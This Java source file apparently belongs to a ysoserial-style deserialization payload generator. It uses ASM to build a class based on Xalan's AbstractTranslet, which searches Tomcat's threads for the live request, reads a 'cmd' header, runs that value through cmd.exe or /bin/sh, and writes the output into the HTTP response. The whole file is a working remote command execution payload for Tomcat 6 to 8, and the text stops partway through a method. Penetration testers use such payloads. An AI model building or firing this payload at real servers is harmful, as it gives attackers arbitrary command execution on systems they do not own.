package yso.payloads.exploitType;

import org.objectweb.asm.*;
import yso.payloads.annotation.Authors;
import yso.payloads.annotation.Dependencies;

@Authors({Authors.XRAY})
@Dependencies({"tomcat:tomcat:6.0-8.0"})
public class XrayCmd implements Opcodes, EXP {

    public static byte[] dump() {
        ClassWriter cw = new ClassWriter(0);
        FieldVisitor fv;
        MethodVisitor mv;
        AnnotationVisitor av0;

        cw.visit(V1_7, ACC_PUBLIC + ACC_SUPER, "XrayPoc", null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);

        cw.visitSource("XrayPoc.java", null);

        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(12, l3);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", "<init>", "()V", false);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(13, l4);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ISTORE, 1);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(14, l5);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Thread", "currentThread", "()Ljava/lang/Thread;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Thread", "getThreadGroup", "()Ljava/lang/ThreadGroup;", false);
            mv.visitLdcInsn("threads");
            mv.visitMethodInsn(INVOKESTATIC, "XrayPoc", "getFV", "(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "[Ljava/lang/Thread;");
            mv.visitTypeInsn(CHECKCAST, "[Ljava/lang/Thread;");
            mv.visitVarInsn(ASTORE, 2);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(16, l6);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ISTORE, 3);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitFrame(Opcodes.F_FULL, 4, new Object[]{"XrayPoc", Opcodes.INTEGER, "[Ljava/lang/Thread;", Opcodes.INTEGER}, 0, new Object[]{});
            mv.visitVarInsn(ILOAD, 3);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(ARRAYLENGTH);
            Label l8 = new Label();
            mv.visitJumpInsn(IF_ICMPGE, l8);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(17, l9);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitVarInsn(ILOAD, 3);
            mv.visitInsn(AALOAD);
            mv.visitVarInsn(ASTORE, 4);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(18, l10);
            mv.visitVarInsn(ALOAD, 4);
            Label l11 = new Label();
            mv.visitJumpInsn(IFNULL, l11);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLineNumber(19, l12);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Thread", "getName", "()Ljava/lang/String;", false);
            mv.visitVarInsn(ASTORE, 5);
            Label l13 = new Label();
            mv.visitLabel(l13);
            mv.visitLineNumber(20, l13);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitLdcInsn("exec");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "contains", "(Ljava/lang/CharSequence;)Z", false);
            mv.visitJumpInsn(IFNE, l11);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitLdcInsn("http");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "contains", "(Ljava/lang/CharSequence;)Z", false);
            mv.visitJumpInsn(IFEQ, l11);
            Label l14 = new Label();
            mv.visitLabel(l14);
            mv.visitLineNumber(21, l14);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitLdcInsn("target");
            mv.visitMethodInsn(INVOKESTATIC, "XrayPoc", "getFV", "(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 6);
            Label l15 = new Label();
            mv.visitLabel(l15);
            mv.visitLineNumber(22, l15);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitTypeInsn(INSTANCEOF, "java/lang/Runnable");
            mv.visitJumpInsn(IFEQ, l11);
            mv.visitLabel(l0);
            mv.visitLineNumber(24, l0);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitLdcInsn("this$0");
            mv.visitMethodInsn(INVOKESTATIC, "XrayPoc", "getFV", "(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;", false);
            mv.visitLdcInsn("handler");
            mv.visitMethodInsn(INVOKESTATIC, "XrayPoc", "getFV", "(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;", false);
            mv.visitLdcInsn("global");
            mv.visitMethodInsn(INVOKESTATIC, "XrayPoc", "getFV", "(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 6);
            mv.visitLabel(l1);
            mv.visitLineNumber(27, l1);
            Label l16 = new Label();
            mv.visitJumpInsn(GOTO, l16);
            mv.visitLabel(l2);
            mv.visitLineNumber(25, l2);
            mv.visitFrame(Opcodes.F_FULL, 7, new Object[]{"XrayPoc", Opcodes.INTEGER, "[Ljava/lang/Thread;", Opcodes.INTEGER, "java/lang/Thread", "java/lang/String", "java/lang/Object"}, 1, new Object[]{"java/lang/Exception"});
            mv.visitVarInsn(ASTORE, 7);
            Label l17 = new Label();
            mv.visitLabel(l17);
            mv.visitLineNumber(26, l17);
            mv.visitJumpInsn(GOTO, l11);
            mv.visitLabel(l16);
            mv.visitLineNumber(29, l16);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitLdcInsn("processors");
            mv.visitMethodInsn(INVOKESTATIC, "XrayPoc", "getFV", "(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "java/util/List");
            mv.visitVarInsn(ASTORE, 7);
            Label l18 = new Label();
            mv.visitLabel(l18);
            mv.visitLineNumber(31, l18);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ISTORE, 8);
            Label l19 = new Label();
            mv.visitLabel(l19);
            mv.visitFrame(Opcodes.F_APPEND, 2, new Object[]{"java/util/List", Opcodes.INTEGER}, 0, null);
            mv.visitVarInsn(ILOAD, 8);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/util/List", "size", "()I", true);
            Label l20 = new Label();
            mv.visitJumpInsn(IF_ICMPGE, l20);
            Label l21 = new Label();
            mv.visitLabel(l21);
            mv.visitLineNumber(32, l21);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitVarInsn(ILOAD, 8);
            mv.visitMethodInsn(INVOKEINTERFACE, "java/util/List", "get", "(I)Ljava/lang/Object;", true);
            mv.visitVarInsn(ASTORE, 9);
            Label l22 = new Label();
            mv.visitLabel(l22);
            mv.visitLineNumber(33, l22);
            mv.visitVarInsn(ALOAD, 9);
            mv.visitLdcInsn("req");
            mv.visitMethodInsn(INVOKESTATIC, "XrayPoc", "getFV", "(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 6);
            Label l23 = new Label();
            mv.visitLabel(l23);
            mv.visitLineNumber(34, l23);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
            mv.visitLdcInsn("getResponse");
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 10);
            Label l24 = new Label();
            mv.visitLabel(l24);
            mv.visitLineNumber(36, l24);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
            mv.visitLdcInsn("getHeader");
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("cmd");
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "java/lang/String");
            mv.visitVarInsn(ASTORE, 5);
            Label l25 = new Label();
            mv.visitLabel(l25);
            mv.visitLineNumber(37, l25);
            mv.visitVarInsn(ALOAD, 5);
            Label l26 = new Label();
            mv.visitJumpInsn(IFNULL, l26);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "isEmpty", "()Z", false);
            mv.visitJumpInsn(IFNE, l26);
            Label l27 = new Label();
            mv.visitLabel(l27);
            mv.visitLineNumber(38, l27);
            mv.visitLdcInsn("os.name");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/System", "getProperty", "(Ljava/lang/String;)Ljava/lang/String;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "toLowerCase", "()Ljava/lang/String;", false);
            mv.visitLdcInsn("win");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "contains", "(Ljava/lang/CharSequence;)Z", false);
            Label l28 = new Label();
            mv.visitJumpInsn(IFEQ, l28);
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("cmd.exe");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitLdcInsn("/c");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitInsn(AASTORE);
            Label l29 = new Label();
            mv.visitJumpInsn(GOTO, l29);
            mv.visitLabel(l28);
            mv.visitFrame(Opcodes.F_APPEND, 2, new Object[]{"java/lang/Object", "java/lang/Object"}, 0, null);
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("/bin/sh");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitLdcInsn("-c");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitInsn(AASTORE);
            mv.visitLabel(l29);
            mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[]{"[Ljava/lang/String;"});
            mv.visitVarInsn(ASTORE, 11);
            Label l30 = new Label();
            mv.visitLabel(l30);
            mv.visitLineNumber(39, l30);
            mv.visitVarInsn(ALOAD, 10);
            mv.visitTypeInsn(NEW, "java/util/Scanner");
            mv.visitInsn(DUP);
            mv.visitTypeInsn(NEW, "java/lang/ProcessBuilder");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 11);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/ProcessBuilder", "<init>", "([Ljava/lang/String;)V", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/ProcessBuilder", "start", "()Ljava/lang/Process;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "getInputStream", "()Ljava/io/InputStream;", false);
            mv.visitMethodInsn(INVOKESPECIAL, "java/util/Scanner", "<init>", "(Ljava/io/InputStream;)V", false);
            mv.visitLdcInsn("\\A");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/util/Scanner", "useDelimiter", "(Ljava/lang/String;)Ljava/util/Scanner;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/util/Scanner", "next", "()Ljava/lang/String;", false);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "getBytes", "()[B", false);
            mv.visitMethodInsn(INVOKESTATIC, "XrayPoc", "writeBody", "(Ljava/lang/Object;[B)V", false);
            Label l31 = new Label();
            mv.visitLabel(l31);
            mv.visitLineNumber(40, l31);
            mv.visitInsn(ICONST_1);
            mv.visitVarInsn(ISTORE, 1);
            mv.visitLabel(l26);
            mv.visitLineNumber(43, l26);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ILOAD, 1);
            Label l32 = new Label();
            mv.visitJumpInsn(IFEQ, l32);
            Label l33 = new Label();
            mv.visitLabel(l33);
            mv.visitLineNumber(44, l33);
            mv.visitJumpInsn(GOTO, l20);
            mv.visitLabel(l32);
            mv.visitLineNumber(31, l32);
            mv.visitFrame(Opcodes.F_CHOP, 2, null, 0, null);
            mv.visitIincInsn(8, 1);
            mv.visitJumpInsn(GOTO, l19);
            mv.visitLabel(l20);
            mv.visitLineNumber(48, l20);
            mv.visitFrame(Opcodes.F_CHOP, 1, null, 0, null);
            mv.visitVarInsn(ILOAD, 1);
            mv.visitJumpInsn(IFEQ, l11);
            Label l34 = new Label();
            mv.visitLabel(l34);
            mv.visitLineNumber(49, l34);
            mv.visitJumpInsn(GOTO, l8);
            mv.visitLabel(l11);
            mv.visitLineNumber(16, l11);
            mv.visitFrame(Opcodes.F_FULL, 4, new Object[]{"XrayPoc", Opcodes.INTEGER, "[Ljava/lang/Thread;", Opcodes.INTEGER}, 0, new Object[]{});
            mv.visitIincInsn(3, 1);
            mv.visitJumpInsn(GOTO, l7);
            mv.visitLabel(l8);
            mv.visitLineNumber(56, l8);
            mv.visitFrame(Opcodes.F_CHOP, 1, null, 0, null);
            mv.visitInsn(RETURN);
            Label l35 = new Label();
            mv.visitLabel(l35);
            mv.visitLocalVariable("var13", "Ljava/lang/Exception;", null, l17, l16, 7);
            mv.visitLocalVariable("var12", "[Ljava/lang/String;", null, l30, l26, 11);
            mv.visitLocalVariable("var11", "Ljava/lang/Object;", null, l22, l32, 9);
            mv.visitLocalVariable("var2", "Ljava/lang/Object;", null, l24, l32, 10);
            mv.visitLocalVariable("var10", "I", null, l19, l20, 8);
            mv.visitLocalVariable("var9", "Ljava/util/List;", null, l18, l11, 7);
            mv.visitLocalVariable("var1", "Ljava/lang/Object;", null, l15, l11, 6);
            mv.visitLocalVariable("var3", "Ljava/lang/String;", null, l13, l11, 5);
            mv.visitLocalVariable("var7", "Ljava/lang/Thread;", null, l10, l11, 4);
            mv.visitLocalVariable("var6", "I", null, l7, l8, 3);
            mv.visitLocalVariable("this", "LXrayPoc;", null, l3, l35, 0);
            mv.visitLocalVariable("var4", "Z", null, l5, l35, 1);
            mv.visitLocalVariable("var5", "[Ljava/lang/Thread;", null, l6, l35, 2);
            mv.visitMaxs(6, 12);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PRIVATE + ACC_STATIC, "writeBody", "(Ljava/lang/Object;[B)V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/NoSuchMethodException");
            mv.visitLabel(l0);
            mv.visitLineNumber(62, l0);
            mv.visitLdcInsn("org.apache.tomcat.util.buf.ByteChunk");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(63, l3);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "newInstance", "()Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(64, l4);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitLdcInsn("setBytes");
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("[B"));
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitFieldInsn(GETSTATIC, "java/lang/Integer", "TYPE", "Ljava/lang/Class;");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitFieldInsn(GETSTATIC, "java/lang/Integer", "TYPE", "Ljava/lang/Class;");
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(NEW, "java/lang/Integer");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Integer", "<init>", "(I)V", false);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitTypeInsn(NEW, "java/lang/Integer");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitInsn(ARRAYLENGTH);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Integer", "<init>", "(I)V", false);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(65, l5);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
            mv.visitLdcInsn("doWrite");
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            mv.visitLabel(l1);
            mv.visitLineNumber(70, l1);
            Label l6 = new Label();
            mv.visitJumpInsn(GOTO, l6);
            mv.visitLabel(l2);
            mv.visitLineNumber(66, l2);
            mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[]{"java/lang/NoSuchMethodException"});
            mv.visitVarInsn(ASTORE, 4);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(67, l7);
            mv.visitLdcInsn("java.nio.ByteBuffer");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(68, l8);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitLdcInsn("wrap");
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("[B"));
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(69, l9);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
            mv.visitLdcInsn("doWrite");
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitInsn(ICONST_1);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(POP);
            mv.visitLabel(l6);
            mv.visitLineNumber(72, l6);
            mv.visitFrame(Opcodes.F_APPEND, 2, new Object[]{"java/lang/Object", "java/lang/Class"}, 0, null);
            mv.visitInsn(RETURN);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLocalVariable("var2", "Ljava/lang/Object;", null, l4, l2, 2);
            mv.visitLocalVariable("var3", "Ljava/lang/Class;", null, l3, l2, 3);
            mv.visitLocalVariable("var5", "Ljava/lang/NoSuchMethodException;", null, l7, l6, 4);
            mv.visitLocalVariable("var0", "Ljava/lang/Object;", null, l0, l10, 0);
            mv.visitLocalVariable("var1", "[B", null, l0, l10, 1);
            mv.visitLocalVariable("var2", "Ljava/lang/Object;", null, l9, l10, 2);
            mv.visitLocalVariable("var3", "Ljava/lang/Class;", null, l8, l10, 3);
            mv.visitMaxs(8, 5);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PRIVATE + ACC_STATIC, "getFV", "(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/NoSuchFieldException");
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(75, l3);
            mv.visitInsn(ACONST_NULL);
            mv.visitVarInsn(ASTORE, 2);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(76, l4);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(78, l5);
            mv.visitFrame(Opcodes.F_APPEND, 2, new Object[]{"java/lang/reflect/Field", "java/lang/Class"}, 0, null);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitLdcInsn(Type.getType("Ljava/lang/Object;"));
            Label l6 = new Label();
            mv.visitJumpInsn(IF_ACMPEQ, l6);
            mv.visitLabel(l0);
            mv.visitLineNumber(80, l0);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredField", "(Ljava/lang/String;)Ljava/lang/reflect/Field;", false);
            mv.visitVarInsn(ASTORE, 2);
            mv.visitLabel(l1);
            mv.visitLineNumber(81, l1);
            mv.visitJumpInsn(GOTO, l6);
            mv.visitLabel(l2);
            mv.visitLineNumber(82, l2);
            mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[]{"java/lang/NoSuchFieldException"});
            mv.visitVarInsn(ASTORE, 4);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(83, l7);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getSuperclass", "()Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(84, l8);
            mv.visitJumpInsn(GOTO, l5);
            mv.visitLabel(l6);
            mv.visitLineNumber(87, l6);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 2);
            Label l9 = new Label();
            mv.visitJumpInsn(IFNONNULL, l9);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(88, l10);
            mv.visitTypeInsn(NEW, "java/lang/NoSuchFieldException");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/NoSuchFieldException", "<init>", "(Ljava/lang/String;)V", false);
            mv.visitInsn(ATHROW);
            mv.visitLabel(l9);
            mv.visitLineNumber(90, l9);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "setAccessible", "(Z)V", false);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(91, l11);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Field", "get", "(Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(ARETURN);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitLocalVariable("var5", "Ljava/lang/NoSuchFieldException;", null, l7, l8, 4);
            mv.visitLocalVariable("var0", "Ljava/lang/Object;", null, l3, l12, 0);
            mv.visitLocalVariable("var1", "Ljava/lang/String;", null, l3, l12, 1);
            mv.visitLocalVariable("var2", "Ljava/lang/reflect/Field;", null, l4, l12, 2);
            mv.visitLocalVariable("var3", "Ljava/lang/Class;", null, l5, l12, 3);
            mv.visitMaxs(3, 5);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
            mv.visitCode();
            Label l0 = new Label();
            mv.visitLabel(l0);
            mv.visitLineNumber(98, l0);
            mv.visitInsn(RETURN);
            Label l1 = new Label();
            mv.visitLabel(l1);
            mv.visitLocalVariable("this", "LXrayPoc;", null, l0, l1, 0);
            mv.visitLocalVariable("document", "Lcom/sun/org/apache/xalan/internal/xsltc/DOM;", null, l0, l1, 1);
            mv.visitLocalVariable("handlers", "[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;", null, l0, l1, 2);
            mv.visitMaxs(0, 3);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[]{"com/sun/org/apache/xalan/internal/xsltc/TransletException"});
            mv.visitCode();
            Label l0 = new Label();
            mv.visitLabel(l0);
            mv.visitLineNumber(103, l0);
            mv.visitInsn(RETURN);
            Label l1 = new Label();
            mv.visitLabel(l1);
